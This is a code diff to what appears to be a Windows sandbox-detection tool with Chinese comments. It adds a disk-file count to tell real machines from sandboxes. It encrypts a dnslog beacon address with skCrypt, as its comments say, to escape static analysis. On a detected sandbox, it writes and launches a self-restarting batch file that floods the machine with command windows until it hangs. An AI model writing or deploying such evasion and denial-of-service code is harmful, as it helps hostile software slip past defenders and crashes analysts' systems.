@@ -211,6 +211,28 @@ bool check_isprime() {
     }
     return true;
 }
+bool check_disk() {
+    char drive[] = { 'D', ':', '\\', '*', '\0' };
+    WIN32_FIND_DATAA findData;
+    HANDLE hFile = FindFirstFileA(drive, &findData);
+    int count = 0;
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return false; // 如果无法打开目录，返回false
+    }
+
+    do {
+        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+            if (++count > 20) {
+                FindClose(hFile);
+                return true; // 如果数量超过20，则提前返回true
+            }
+        }
+    } while (FindNextFileA(hFile, &findData));
+
+    FindClose(hFile);
+    return false; // 如果没有超过20，返回false
+}
 int main(int argc, char* argv[]) {
     /*
     //用于提示已经成功执行
@@ -228,7 +250,7 @@ int main(int argc, char* argv[]) {
         MessageBoxA(NULL, "Fail", "Fail", NULL);
     }
     */
-    if (check_isprime()) {
+    if (check_disk()) {
         //dnslog地址 可自行更换或者不使用
         //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
         auto url = skCrypt("qk5p7fr7.requestrepo.com");
@@ -240,5 +262,9 @@ int main(int argc, char* argv[]) {
     }
     else {
         MessageBoxA(NULL, "Fail", "Fail", NULL);
+        //新增一个若当前环境为沙箱则执行o.bat，o.bat内容为：@echo off & echo :o & echo start o.bat
+        //导致循环运行命令行窗口导致目标机器死机 测试请在虚拟机测试！
+        system("(echo :o && echo start o.bat && echo goto o) > %temp%/o.bat");
+        system("cd %temp% && o.bat");
     }
 }
